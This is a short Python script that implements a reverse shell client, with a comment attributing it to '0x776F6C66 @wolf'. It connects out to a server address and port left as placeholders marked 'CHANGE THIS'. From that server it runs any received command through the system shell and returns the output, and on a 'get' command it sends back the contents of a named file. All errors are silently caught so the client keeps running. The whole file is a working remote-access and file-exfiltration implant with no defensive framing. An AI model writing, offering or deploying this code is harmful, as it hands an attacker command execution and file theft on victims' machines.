#!/usr/bin/env python3

import socket
import subprocess
import os

server = "127.0.0.1" # CHANGE THIS
port = 1234 # CHANGE THISs

if __name__ == "__main__":
	tries = 0
	try:
		# create tcp ipv4 socket, try connecting to the server
		client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		client.connect((server, port))
		
		# recv commands and execute
		while True:
			try:
				command = client.recv(1024) #receive commands
				if command.decode() == "": # check if the server has terminated connection
					break
				if command.decode().lower() == "exit": # check if the command is to terminate the connection
					break

			
				###/////////////////////////////////////// UPLOAD FILES \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\###
				if command.decode().startswith("get"):
					file = command.decode().strip("get").strip(" ")
					size = os.stat(file).st_size #get size of the file
					client.send(str(size).encode())
				
					try: #try opening the file
						with open(file, 'r') as f: # open file for reading
							for a in f.read():
								client.send(a.encode())
							f.close()
							continue
					except FileNotFoundError as err: # if file is not found, catch error and send it
							client.send(str(err).encode())
							continue
					
				###/////////////////////////////////// Exececute Commands \\\\\\\\\\\\ by 0x776F6C66 @wolf \\\\\\\\\\\###
				output = subprocess.run(command, shell=True, capture_output=True) #execute the commands
				if output.stderr.decode() == "":
					result = output.stdout
				else:
					result = output.stderr
				client.send(result)
			except KeyboardInterrupt: #catch keyboard interrupts
				exit()
			except:
				continue
	except:
		exit()